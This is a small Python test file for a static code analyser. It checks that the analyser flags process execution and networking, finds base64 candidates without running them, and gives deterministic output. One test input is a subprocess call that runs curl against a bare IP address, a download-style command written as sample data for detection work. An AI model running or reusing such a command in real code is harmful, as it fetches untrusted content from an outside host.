from static_analysis import analyze_static


def test_detects_process_execution_and_networking():
    result = analyze_static("import subprocess\\nsubprocess.run(['curl','http://1.2.3.4/p'])")
    assert "command_execution" in result["capabilities"]
    assert "download_execution" in result["capabilities"]
    assert result["finding_count"] >= 2


def test_detects_base64_without_executing_it():
    result = analyze_static("payload='aGVsbG8gdGhpcyBpcyBhIHRlc3QgcGF5bG9hZA=='")
    assert result["encoded_candidates"]
    assert result["encoded_candidates"][0]["encoding"] == "base64"


def test_is_deterministic():
    code = "print('hello')"
    assert analyze_static(code) == analyze_static(code)
